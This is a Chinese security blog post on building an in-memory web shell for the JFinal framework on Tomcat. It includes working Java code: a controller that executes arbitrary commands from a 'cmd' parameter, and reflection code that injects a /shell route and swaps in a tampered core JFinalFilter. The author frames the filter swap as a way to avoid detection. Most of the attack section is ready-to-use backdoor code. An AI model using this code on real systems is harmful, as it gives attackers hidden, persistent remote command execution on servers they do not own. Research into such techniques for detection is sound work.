0x01 介绍
-------

看了师傅们的`Tomcat`和`SpringMVC`内存马思路

于是我尝试找了个国产框架做挖掘，经过不少的坑，成功造出了内存马

核心原理类似`Filter`型`Tomcat`内存马，不过又有较大的区别

在成功挖出内存马的时候，有了进一步的思考，也许一些思路可以用于`Tomcat`内存马的进阶免杀

框架名称是`JFinal`，在国内`Java`开发圈子中名气不错，应用范围不如`Spring`不过也不算冷门

**github**地址为：<https://github.com/jfinal/jfinal>

**gitee**地址为：<https://gitee.com/jfinal/jfinal>

目前该项目在Github有**3.1K**的Star，在Gitee上甚至有**8K**的Star

0x02 源码浅析
---------

使用最新版`JFinal`框架

```xml
        <dependency>
            <groupId>com.jfinal</groupId>
            <artifactId>jfinal</artifactId>
            <version>4.9.15</version>
        </dependency>
```

简单写了点功能代码，该框架有点类似`SpringMVC`，基于`Tomcat`运行，路由控制也叫做`Controller`

```java
@Path("/test")
public class TestController extends Controller {
    public void index(){
        String param = getPara("param");
    }
}
```

添加路由需要编写一个类继承自`JFinalConfig`类，重写`configRoute`方法，按照如下的方式添加

```java
public class DemoConfig extends JFinalConfig {
    @Override
    public void configRoute(Routes me) {
        me.add("/hello", HelloController.class);
        me.add("/test", TestController.class);
    }
}
```

在`web.xml`中需要配置一个核心`Filter`，其中初始化参数为上文的配置类

```xml
<filter>
    <filter-name>jfinal</filter-name>
    <filter-class>com.jfinal.core.JFinalFilter</filter-class>
    <init-param>
        <param-name>configClass</param-name>
        <param-value>org.sec.jdemo.DemoConfig</param-value>
    </init-param>
</filter>
<filter-mapping>
    <filter-name>jfinal</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

这个核心`Filter`代码如下，删减了无用的部分

```java
public class JFinalFilter implements Filter {

   protected JFinalConfig jfinalConfig;
   ...
   protected Handler handler;
   // 单例模式的JFinal类
   protected static final JFinal jfinal = JFinal.me();
   // 允许空参构造
   public JFinalFilter() {
      this.jfinalConfig = null;
   }
   // 构造
   public JFinalFilter(JFinalConfig jfinalConfig) {
      this.jfinalConfig = jfinalConfig;
   }
   // 初始化
   @SuppressWarnings("deprecation")
   public void init(FilterConfig filterConfig) throws ServletException {
      // 空参构造会根据上文配置类生成配置信息
      if (jfinalConfig == null) {
         // 解析配置类
         createJFinalConfig(filterConfig.getInitParameter("configClass"));
      }
      // 初始化
      jfinal.init(jfinalConfig, filterConfig.getServletContext());
      ...
      // 处理请求相关交给handler
      handler = jfinal.getHandler();
   }

   public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
      ...
      // 处理请求
      handler.handle(target, request, response, isHandled);
      ...
      // 继续传递Filter
      chain.doFilter(request, response);
   }
   // 空参构造会调用这里
   protected void createJFinalConfig(String configClass) {
      // 如果配置类为空则报错
      if (configClass == null) {
         throw new RuntimeException("The configClass parameter of JFinalFilter can not be blank");
      }
      try {
         // 反射加载配置类
         Object temp = Class.forName(configClass).newInstance();
         jfinalConfig = (JFinalConfig)temp;
      } catch (ReflectiveOperationException e) {
         throw new RuntimeException("Can not create instance of class: " + configClass, e);
      }
   }
}
```

源码大致看到这里就可以了，其中的一些坑将在后文分析

0x03 思路分析
---------

`Jfinal`不如`SpringMVC`完善，导致了一些困难

例如它没有`Spring`的`Context`，也没有各种`register*`接口供用户动态注册

添加内存马的思路很简单，想办法注册一个路由，映射到恶意的代码造成RCE

所以首先需要分析框架如何处理请求的

所有的映射关系都保存在这样的一个类中

```java
public class ActionMapping {
   // 用户配置的路由
   protected Routes routes;
   // 映射关系的记录: /test->Action
   protected Map<String, Action> mapping = new HashMap<String, Action>(2048, 0.5F);
   // 构造
   public ActionMapping(Routes routes) {
      this.routes = routes;
   }
   // 这个方法较长
   // 目的很简单：routes转mapping
   protected void buildActionMapping() {...}
```

在`ActionHandler`类中处理请求，该类比较复杂

```java
public class ActionHandler extends Handler {
    // 映射关系记录
    protected ActionMapping actionMapping;
    // 注意这个方法
    protected void init(ActionMapping actionMapping, Constants constants) {
        this.actionMapping = actionMapping;
        ...
    }
    ...
    protected Action getAction(String target, String[] urlPara) {
        // 从映射关系里查找
        return actionMapping.getAction(target, urlPara);
    }
    // 处理请求
    public void handle(String target, HttpServletRequest request, HttpServletResponse response, boolean[] isHandled) {
        if (target.indexOf('.') != -1) {
            return ;
        }
        ...
        Action action = getAction(target, urlPara);
        // 没有这个映射关系返回404
        if (action == null) {
            if (log.isWarnEnabled()) {
                log.warn("404 Action Not Found: " + (qs == null ? target : target + "?" + qs));
            }
            return ;
        }
        ...
    }
}
```

其实看完`ActionHandler`方法后大概有思路了，构造一个新的映射关系，替换全局变量`actionMapping`

然而不现实，因为该变量是非静态的，无法反射获取，无法做到直接获取JVM中的对象

所以只能走`init`方法，寻找构造`ActionHandler`类的地方，分析传入的`ActionMapping`参数是否可控

在`JFinal`类找到唯一的一处调用`init`方法代码

不过有了新的问题：`JFinal`类的`Handler`属性和`actionMapping`都不可以反射设置

先静心继续分析，总会有突破口

```java
private Handler handler;
private ActionMapping actionMapping;

private void initHandler() {
    ActionHandler actionHandler = Config.getHandlers().getActionHandler();
    if (actionHandler == null) {
        actionHandler = new ActionHandler();
    }

    actionHandler.init(actionMapping, constants);
    handler = HandlerFactory.getHandler(Config.getHandlers().getHandlerList(), actionHandler);
}

Handler getHandler() {
    return handler;
}
```

注意到`handler`的一处对外方法`getHandler`

寻找调用点，在`JfinalFilter`的`init`方法中被调用

```java
// Handler
protected Handler handler;
// 单例模式的Jfinal对象
protected static final JFinal jfinal = JFinal.me();
public void init(FilterConfig filterConfig) throws ServletException {
    if (jfinalConfig == null) {
        createJFinalConfig(filterConfig.getInitParameter("configClass"));
    }

    jfinal.init(jfinalConfig, filterConfig.getServletContext());
    ...
    // 这里被调用
    handler = jfinal.getHandler();  
}
```

在`init`方法被初始化`ActionHandler`后，在`doFilter`方法中调用

看到`handler.handle`方法，大概有了新思路

```java
public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
    ...
    // 处理请求
    handler.handle(target, request, response, isHandled);
    ...
    // 继续传递Filter
    chain.doFilter(request, response);
}
```

只要可以操作`JFinalFilter`的`ActionHandler`属性，设置其中的`ActionMapping`为添加了恶意的映射，在`doFilter`方法中调用`handle`方法，使请求可以匹配到恶意`Controller`进而实现内存马

不过`JFinalFilter`的`ActionHandler`非静态属性是不可以反射设置的

唯一设置的地方在这里：`jfinal.getHandler();`

这个`jfinal`是什么东西？

```java
protected static final JFinal jfinal = JFinal.me();
```

这是一个静态`JFinal`类变量，虽然反射设置`final`属性比较麻烦，但可以设置了，找到突破点！

结合以上的思路，构造出一个恶意的`JFinal`类，设置对应的属性，反射调用`initHandler`方法得到目标`ActionHandler`

然后设置`JFinalFilter`的`JFinal`属性为构造的恶意类，这时候触发`JFinalFilter`的`init`方法即可实现添加路由

新的问题出现，无法设置JVM中的`JFinalFilter`对象的属性，只能设置新对象的属性

于是想到一个巧妙的手法：

1. 利用**c0ny1**师傅写的`Tomcat`删除`Filter`代码，删除目前的`JFinalFilter`
2. 添加反射构造的恶意`JFinalFilter`，甚至不需要手动触发`init`方法即可实现内存马

又有一个新的问题，目前运行环境已有了的路由会和新的冲突

例如已有`/hello`如果重新注册`Filter`会再次加载配置文件，处理其中的`/hello`会报错

我们新增的内存马路由排序是位于`/hello`之后的，抛出异常后导致无法处理内存马路由

```java
Action action = new Action(controllerPath, actionKey, controllerClass, method, methodName, actionInters, route.getFinalViewPath(routes.getBaseViewPath()));
if (mapping.put(actionKey, action) != null) {
    throw new RuntimeException(buildMsg(actionKey, controllerClass, method));
}
```

解决起来不麻烦，自己造一个空的配置文件，并设置到`JFinalFilter`调用`init`方法的参数

```java
public class EmptyConfig extends JFinalConfig {
    @Override
    public void configConstant(Constants me) {

    }

    @Override
    public void configRoute(Routes me) {

    }

    @Override
    public void configEngine(Engine me) {

    }

    @Override
    public void configPlugin(Plugins me) {

    }

    @Override
    public void configInterceptor(Interceptors me) {

    }

    @Override
    public void configHandler(Handlers me) {

    }
}
```

在`JFinalFilter`的`init`方法中，如果`filterConfig`存在，如果不为空那么就不会解析配置，成功绕过

（这个空文件和null要区分开，空文件是为了防止**路由冲突**）

这时获取到的`handler`就是恶意构造的

```java
protected JFinalConfig jfinalConfig;
public void init(FilterConfig filterConfig) throws ServletException {
    if (jfinalConfig == null) {
        createJFinalConfig(filterConfig.getInitParameter("configClass"));
    }
    ...
    handler = jfinal.getHandler();
}
```

0x04 代码实现
---------

思路清晰后就剩代码实现了

首先来一个恶意的`Controller`

```java
public class ShellController extends Controller {
    public void index() throws Exception {
        String cmd = getPara("cmd");
        // 简单的回显马
        Process process = Runtime.getRuntime().exec(cmd);
        StringBuilder outStr = new StringBuilder();
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(process.getInputStream());
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            outStr.append(s).append("\n");
        }
        renderText(outStr.toString());
    }
}
```

添加恶意路由

```java
Class<?> clazz = Class.forName("com.jfinal.core.Config");
Field routes = clazz.getDeclaredField("routes");
routes.setAccessible(true);
Routes r = (Routes) routes.get(Routes.class);
r.add("/shell", ShellController.class);
```

构造恶意`JFinal`对象并设置`ActionMapping`属性

```java
Class<?> jfClazz = Class.forName("com.jfinal.core.JFinal");
// 拿到当前单例模式对象
Field me = jfClazz.getDeclaredField("me");
me.setAccessible(true);
JFinal instance = (JFinal) me.get(JFinal.class);
// 属性
Field mapping = instance.getClass().getDeclaredField("actionMapping");
mapping.setAccessible(true);
// 构造恶意的ActionMapping对象
ActionMapping actionMapping = new ActionMapping(r);
// 设置了ActionMapping对象的Routes属性还不够
// 需要调用ActionMapping的buildActionMapping把Routes转为Mapping
Method build = actionMapping.getClass().getDeclaredMethod("buildActionMapping");
build.setAccessible(true);
build.invoke(actionMapping);
// 设置属性
mapping.set(instance, actionMapping);
```

这一步也是至关重要，必须调用了`JFinal.initHandler`才可以调用到`ActionHandler.init`方法

调用`ActionHandler.init`方法传入上文设置的恶意`ActionMapping`才可以构造出恶意的`ActionHandler`

```java
Method initHandler = jfClazz.getDeclaredMethod("initHandler");
initHandler.setAccessible(true);
initHandler.invoke(instance);
```

构造一个新的`JFinalFilter`对象

```java
Class<?> filterClazz = Class.forName("com.jfinal.core.JFinalFilter");
JFinalFilter filter = (JFinalFilter) filterClazz.newInstance();
```

设置`jfinal`属性，对象的`final`属性操作比较麻烦

```java
Field field = filterClazz.getDeclaredField("jfinal");
field.setAccessible(true);
Field modifiersField = Field.class.getDeclaredField("modifiers");
modifiersField.setAccessible(true);
// 处理final问题
modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
field.set(filter, instance);
```

构造一个空的`jfinalConfig`并设置到`JfinalFilter`对象中

```java
Field configField = filterClazz.getDeclaredField("jfinalConfig");
configField.setAccessible(true);
configField.set(filter,new EmptyConfig());
```

参考**c0ny1**师傅的删除`Filter`代码删除已存在的`JFinalFilter`对象

```java
// 不依赖request的StandartContext
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)
    Thread.currentThread().getContextClassLoader();
StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
deleteFilter(standardCtx,"jfinal");
```

添加新的`JfinalFilter`

```java
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
// 这个名字可以确定
// 99%的开发者都不会改变
filterDef.setFilterName("jfinal");
filterDef.setFilterClass(filter.getClass().getName());
// 必须设置一个init param参数
// 但具体的值可以随意写
// 因为已反射设置为空的配置
filterDef.addInitParameter("configClass","Test");
standardCtx.addFilterDef(filterDef);
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName("jfinal");
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardCtx.addFilterMapBefore(filterMap);
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardCtx, filterDef);
HashMap<String, Object> filterConfigs = getFilterConfig(standardCtx);
filterConfigs.put("jfinal", filterConfig);
```

涉及到的几个方法代码，参考自**c0ny1**师傅

```java
// 删除Filter
public synchronized void deleteFilter(StandardContext standardContext, String filterName) throws Exception {
    HashMap<String, Object> filterConfig = getFilterConfig(standardContext);
    Object appFilterConfig = filterConfig.get(filterName);
    Field _filterDef = appFilterConfig.getClass().getDeclaredField("filterDef");
    _filterDef.setAccessible(true);
    Object filterDef = _filterDef.get(appFilterConfig);
    Class clsFilterDef = null;
    try {
        clsFilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    } catch (Exception e) {
        clsFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef");
    }
    Method removeFilterDef = standardContext.getClass().getDeclaredMethod("removeFilterDef",
                                                                          new Class[]{clsFilterDef});
    removeFilterDef.setAccessible(true);
    removeFilterDef.invoke(standardContext, filterDef);

    Class clsFilterMap = null;
    try {
        clsFilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    } catch (Exception e) {
        clsFilterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
    }
    Object[] filterMaps = getFilterMaps(standardContext);
    for (Object filterMap : filterMaps) {
        Field _filterName = filterMap.getClass().getDeclaredField("filterName");
        _filterName.setAccessible(true);
        String filterName0 = (String) _filterName.get(filterMap);
        if (filterName0.equals(filterName)) {
            Method removeFilterMap = standardContext.getClass().getDeclaredMethod("removeFilterMap",
                                                                                  new Class[]{clsFilterMap});
            removeFilterDef.setAccessible(true);
            removeFilterMap.invoke(standardContext, filterMap);
        }
    }
}
// 获取FilterConfig
public HashMap<String, Object> getFilterConfig(StandardContext standardContext) throws Exception {
    Field _filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
    _filterConfigs.setAccessible(true);
    HashMap<String, Object> filterConfigs = (HashMap<String, Object>) _filterConfigs.get(standardContext);
    return filterConfigs;
}
// 获取FilterMap
public Object[] getFilterMaps(StandardContext standardContext) throws Exception {
    Field _filterMaps = standardContext.getClass().getDeclaredField("filterMaps");
    _filterMaps.setAccessible(true);
    Object filterMaps = _filterMaps.get(standardContext);
    Object[] filterArray = null;
    try {
        Field _array = filterMaps.getClass().getDeclaredField("array");
        _array.setAccessible(true);
        filterArray = (Object[]) _array.get(filterMaps);
    } catch (Exception e) {
        filterArray = (Object[]) filterMaps;
    }

    return filterArray;
}
```

0x05 效果
-------

最终效果

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68884a8014508841017970c60783085d0ad8658e.png)

0x06 总结思考
---------

已经能够构造出内存马了，后续的步骤就是找到触发点，例如上传JSP执行或者反序列化漏洞触发，不过这就不是本文的重点了

代码地址：<https://github.com/EmYiQing/JFinalShell>

这种替换`Filter`操作实现的内存马是一种新的免杀思路：

谁都不会想到真正有问题的`filter`会是核心配置`JFinalFilter`

不只可以用于`JFinal`这种，也可以考虑`Tomcat`的`Filter`型以及各种其他框架